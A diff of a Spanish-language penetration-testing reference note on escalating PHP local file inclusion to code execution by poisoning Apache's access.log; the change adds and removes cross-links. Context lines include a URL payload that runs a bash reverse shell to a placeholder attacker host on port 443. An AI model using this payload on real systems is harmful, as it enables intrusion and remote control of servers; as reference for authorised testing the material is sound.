@@ -12,6 +12,7 @@ tags:
 
 > [!info] Referencia pura, no un zettel
 > Cuando tenés LFI que **ejecuta** (include de PHP) y querés RCE sin wrapper. La idea común: **envenenar** un archivo que el server ya escribe con datos que controlás, después incluirlo. Criterio en [[LFI - de lectura a RCE]]. `yi``  ` copia.
+> El criterio y la decisión, en [[MOC - File inclusion]]. Ver también: [[LFI - inclusión local]].
 
 ## Log poisoning — access.log
 
@@ -69,7 +70,3 @@ Si hay un `phpinfo()` accesible: una subida temporal por multipart crea un archi
 3. ?file=../../../../var/log/apache2/access.log&c=bash+-c+'bash+-i+>%26+/dev/tcp/ATACANTE/443+0>%261'
    → reverse shell
 ```
-
-## Relacionadas
-
-[[LFI - de lectura a RCE]] · [[LFI - inclusión local]] · [[MOC - File inclusion]]
